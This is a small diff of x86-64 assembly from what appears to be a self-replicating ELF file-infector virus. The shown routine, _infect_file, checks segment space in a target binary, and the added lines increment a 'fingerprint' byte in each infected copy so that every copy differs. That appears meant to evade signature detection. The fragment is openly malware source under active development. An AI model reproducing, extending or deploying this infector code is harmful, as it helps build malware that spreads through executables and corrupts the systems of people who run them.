@@ -763,6 +763,14 @@ _infect_file: ; (string rdi, stat rsi)
 			jl .unmap ; if size between PT_LOAD isn't enough -> abort
 
 			push rcx
+			; => Change fingerprint (r8 + fingerprint - _start)
+				lea rsi, [rel fingerprint]
+				lea rcx, [rel _start]
+				sub rsi, rcx
+				mov rcx, r8
+				add rcx, rsi
+				inc byte[rcx]
+			;
 			push 8 * 3
 			pop rcx
 
